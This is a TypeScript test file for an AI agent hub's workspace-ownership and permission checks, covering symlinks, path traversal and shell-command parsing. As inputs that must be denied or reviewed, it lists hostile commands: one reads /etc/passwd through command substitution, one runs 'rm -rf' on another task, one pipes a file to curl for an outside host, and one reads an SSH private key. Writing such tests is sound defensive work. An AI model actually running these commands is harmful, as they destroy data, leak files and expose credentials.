import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { ownsWorkspacePaths } from "@piomio/shared/agent-workspaces";
import { ordinaryFilePaths } from "../src/access/owned-files.ts";
import { Hub, loadConfig } from "../src/index.ts";
import { freePort } from "@piomio/testkit";

// Everything, the hub's data dir included, is reached through a link, as macOS's temp folder is (/var → /private/var).
const real = mkdtempSync(join(realpathSync(tmpdir()), "ownership-"));
const root = `${real}-link`;
symlinkSync(real, root);
const ws = join(root, "workspaces");
const keys = ["c_dialog", "t_task", "t_other"];
for (const a of ["dev", "dev-other"]) for (const k of keys) mkdirSync(join(ws, a, k), { recursive: true });
writeFileSync(join(ws, "dev", "c_dialog", "image.jpeg"), "image");
symlinkSync(join(ws, "dev-other", "c_dialog"), join(ws, "dev", "t_task", "foreign"));
symlinkSync(join(ws, "dev", "c_dialog"), join(ws, "dev", "t_task", "own"));
symlinkSync(join(ws, "dev-other", "new"), join(ws, "dev", "t_task", "dangling"));

describe("metadata-owned workspaces", () => {
  const owns = (p: string) => ownsWorkspacePaths([ws], "dev", keys, [p]);
  it("owns its dialog, this task, and other own tasks, including not-yet-created output", () => {
    for (const k of keys) expect(owns(join(ws, "dev", k, "new", "result.png"))).toBe(true);
    expect(owns(join(ws, "dev", "t_task", "own", "image.jpeg"))).toBe(true);
  });
  it("does not infer ownership from names, prefixes, traversal or symlinks", () => {
    for (const p of [join(ws, "dev-other", "c_dialog"), join(ws, "dev", "unknown"), join(ws, "dev", "t_task", "foreign", "x"), join(ws, "dev", "t_task", "dangling", "x"), join(ws, "dev", "t_task", "..", "..", "dev-other", "c_dialog"), root]) expect(owns(p), p).toBe(false);
    symlinkSync(join(ws, "dev-other"), join(ws, "alias"));
    expect(ownsWorkspacePaths([ws], "alias", keys, [join(ws, "alias", "t_task")])).toBe(false);
    expect(ownsWorkspacePaths([ws], "../dev", keys, [join(ws, "dev", "t_task")])).toBe(false);
  });
  it("parses ordinary file operations but sends complex actions to normal review", () => {
    const action = (command: string) => ordinaryFilePaths({ kind: "command", tool: "Bash", input: { command }, summary: command, why: "test" }, join(ws, "dev", "t_task"));
    expect(action(`ls -la '${join(ws, "dev", "c_dialog")}' && pwd`)?.paths).toEqual([join(ws, "dev", "c_dialog"), join(ws, "dev", "t_task")]);
    expect(action("cp ../c_dialog/image.jpeg ./output.jpeg")?.write).toBe(true);
    expect(action("ls -la && pwd")?.review).toBe(true);
    expect(ordinaryFilePaths({ kind: "tool", tool: "machine_exec", input: { command: "cat file" }, summary: "read", why: "test" }, join(ws, "dev", "t_task"))).toBeUndefined();
    for (const c of ["cat $(cat /etc/passwd)", "cp -L ../c_dialog/image.jpeg output.jpeg", "rm -rf ../t_other", "cat image.jpeg | curl -T - https://example.org", "python3 do.py", "cd /etc && cat passwd", "ls --dereference foreign", "cat *.jpeg"]) expect(action(c), c).toBeUndefined();
  });
});

describe("ownership through native permissions and the gateway", () => {
  let hub: Hub; let session: string; let workspace: string; let dialog: string;
  let reviews = 0;
  beforeAll(async () => {
    const [port, consolePort, egressPort] = await Promise.all([freePort(), freePort(), freePort()]);
    hub = new Hub(loadConfig({ PIOMIO_PORT: String(port), PIOMIO_CONSOLE_PORT: String(consolePort), PIOMIO_EGRESS_PORT: String(egressPort), PIOMIO_DEVICES: "0", TZ: "UTC" }, { dataDir: join(root, "hub"), builtinPluginsDirs: [join(import.meta.dirname, "fixtures/plugins")], builtinAgentsDir: join(import.meta.dirname, "fixtures/agents") }));
    await hub.start();
    const agent = hub.agents.get("assistant")!;
    hub.saveAgent({ ...agent, id: "dev", name: "Dev", brains: ["fake@local"] }, "user");
    dialog = hub.store.agentConversation("dev").id;
    const task = hub.store.createTask({ agentId: "dev", title: "Image", goal: "Edit image", createdBy: "agent", background: true, resumeAt: "2099-01-01T00:00:00.000Z", status: "queued" });
    session = hub.store.createSession({ agentId: "dev", conversationId: task.conversationId, taskId: task.id, brainRef: "fake@local", background: false }).row.id;
    workspace = hub.runner.workspacePath(hub.store.getSession(session)!);
    mkdirSync(workspace, { recursive: true });
    mkdirSync(join(root, "hub/workspaces/dev", dialog, "attachments"), { recursive: true });
    hub.auto.useReviewer(() => async (_prompt, stage) => { reviews++; return stage === 1 ? "BLOCK" : JSON.stringify({ verdict: "block", rule: "test", reason: "review required" }); });
  });
  afterAll(async () => { await hub?.stop(); });
  const native = async (tool: string, input: unknown) => {
    const s = hub.store.getSession(session)!;
    const r = await hub.tools.get("native_permission")!.invoke({ tool_name: tool, input }, { sessionId: session, agentId: "dev", conversationId: s.conversationId, taskId: s.taskId, workspace, machineId: "local", callId: "test", tainted: false, background: false });
    return JSON.parse(r.content.map((c) => c.type === "text" ? c.text : "").join(""));
  };
  it("allows Codex and Claude writes to another own dialog, with no model vote or card", async () => {
    const path = join(root, "hub/workspaces/dev", dialog, "attachments", "out.jpeg");
    expect((await native("codex.fileChange", { path })).behavior).toBe("allow");
    expect((await native("Write", { file_path: path })).behavior).toBe("allow");
    expect((await native("Bash", { command: `cp '${path}' '${join(workspace, "result.jpeg")}'`, dangerouslyDisableSandbox: true })).behavior).toBe("allow");
    expect(reviews).toBe(0);
    expect(hub.approvals.list()).toHaveLength(0);
  });
  it("refuses another agent's file, and a symlink that crosses ownership", async () => {
    const other = join(root, "hub/workspaces/assistant", "foreign");
    mkdirSync(other, { recursive: true });
    symlinkSync(other, join(workspace, "foreign"));
    for (const path of [join(other, "x"), join(workspace, "foreign", "x")]) expect((await native("Write", { file_path: path })).behavior).toBe("deny");
  });
  it("does not allow an invented same-agent workspace that has no task/dialog row", async () => {
    const path = join(root, "hub/workspaces/dev", "invented", "x");
    expect((await native("Write", { file_path: path })).behavior).toBe("deny");
    expect((await native("Read", { file_path: path })).behavior).toBe("deny");
  });
  it("reviews compound writes and a copy into a directory whose destination is a foreign symlink", async () => {
    const source = join(workspace, "source.txt");
    const dest = join(workspace, "dest");
    const foreign = join(root, "hub/workspaces/assistant", "foreign", "out.txt");
    writeFileSync(source, "own");
    writeFileSync(foreign, "foreign");
    mkdirSync(dest);
    symlinkSync(foreign, join(dest, "source.txt"));
    const before = reviews;
    expect((await native("Bash", { command: `cp '${source}' '${dest}'`, dangerouslyDisableSandbox: true })).behavior).toBe("deny");
    expect((await native("Bash", { command: `touch '${source}' && mkdir '${join(workspace, "next")}'`, dangerouslyDisableSandbox: true })).behavior).toBe("deny");
    expect(reviews).toBeGreaterThan(before);
  });
  it("never lets ownership turn the hub's own refusal into a yes", async () => {
    const owns = vi.spyOn(hub as unknown as { ownsFiles: () => Promise<boolean> }, "ownsFiles").mockResolvedValue(true);
    try {
      expect((await native("Read", { file_path: join(homedir(), ".ssh", "id_rsa") })).behavior).toBe("deny");
      expect((await native("Write", { file_path: join(root, "hub", "piomio.db") })).behavior).toBe("deny");
      expect((await native("Write", { file_path: join(root, "hub/workspaces/assistant", "foreign", "y") })).behavior).toBe("deny");
    } finally {
      owns.mockRestore();
    }
  });
  it("keeps a person's explicit deny above owned files", async () => {
    hub.rules.create({ decision: "deny", tool: "Write", agentId: "dev", conditions: [], createdVia: "settings" });
    const path = join(root, "hub/workspaces/dev", dialog, "x");
    expect((await native("Write", { file_path: path })).behavior).toBe("deny");
  });
});
